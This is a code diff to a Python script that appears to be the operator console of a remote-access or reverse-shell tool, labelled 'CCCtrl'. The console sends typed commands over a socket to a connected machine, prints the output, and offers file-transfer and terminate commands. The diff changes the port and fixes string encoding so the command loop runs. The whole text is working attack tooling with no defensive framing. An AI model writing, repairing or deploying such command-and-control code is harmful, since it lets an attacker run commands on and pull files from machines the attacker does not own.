@@ -6,7 +6,7 @@ import modules
 
 
 host = '192.168.0.16'
-port = 8080
+port = 2828
 instruction = ''
 
 def connect():
@@ -24,15 +24,15 @@ def connect():
 
 
     while True: 
-        command = input("CCCtrl > ").encode()
+        command = input("CCCtrl > ")
         if command == "==terminate":
             conn.send('==terminate'.encode())
             conn.close() 
             break
-        elif b'==transfer' in command: 
+        elif '==transfer' in command: 
             modules.transfer(conn,command)
         else:
             conn.send(command.encode()) 
-            print(conn.recv(1024))
+            print(conn.recv(1024).decode())
 
 connect()
